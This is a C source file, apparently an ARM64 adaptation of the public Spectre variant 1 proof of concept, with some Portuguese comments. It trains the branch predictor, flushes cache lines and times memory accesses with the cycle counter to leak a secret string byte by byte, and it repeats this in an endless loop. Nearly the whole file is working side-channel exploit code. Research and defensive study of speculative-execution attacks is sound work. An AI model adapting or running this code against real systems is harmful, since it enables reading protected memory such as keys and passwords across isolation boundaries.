#include "../inc/spectre_attack.h"
#include <unistd.h>

unsigned int array1_size = 16;
uint8_t unused1[64]; // Padding to avoid adjacent cache line fetch
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64]; 
uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
volatile uint8_t temp_spectre = 0; // Variable to prevent compiler optimization

void victim_function(size_t x) {
    if (x < array1_size) {
        temp_spectre &= array2[array1[x] * 512];
    }
}

void read_memory_byte_spectre(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = 999; tries > 0; tries--) {
        //flush array2 da cache
        for (i = 0; i < 256; i++) {
            __asm volatile("dc civac, %0" : : "r"(&array2[i * 512]) : "memory");
        }

        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            //flush array1_size to force speculative execution on the branch
            __asm volatile("dc civac, %0" : : "r"(&array1_size) : "memory");
            
            //delay
            for (volatile int z = 0; z < 100; z++) {}

            //branch predictor training
            //x = training_x if j % 6 != 0, otherwise malicious_x
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x); //call the victim function
        }

        //time measurement
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            
            //barreiras e leitura do contador de ciclos (cntvct_el0)
            __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time1) : : "memory");
            junk = *addr;
            __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time2) : : "memory");
            uint64_t diff = time2 - time1;

            if (diff <= (uint64_t)cache_hit_threshold && mix_i != array1[tries % array1_size]) {
                results[mix_i]++;
            }
        }
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }

    //assign values so task_spectre can print them
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

void execute_spectre_attack(int cache_hit_threshold, size_t starting_malicious_x, int bytes_to_read) {
    uint8_t value[2];
    int score[2];
    size_t current_x = starting_malicious_x;

    //try to extract the defined number of bytes
    for (int i = 0; i < bytes_to_read; i++) { 
        read_memory_byte_spectre(cache_hit_threshold, current_x++, value, score);
        
        /* printf("[SPECTRE] Lendo: 0x%02X='%c' score=%d\n", value[0], 
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); */
    }
}

int main() {
    int cache_hit_threshold = 80;
    size_t malicious_x = (size_t)(secret - (char *)array1);
    
    while (1) {
        execute_spectre_attack(cache_hit_threshold, malicious_x, 40);
        usleep(5000); 
    }
    return 0;
}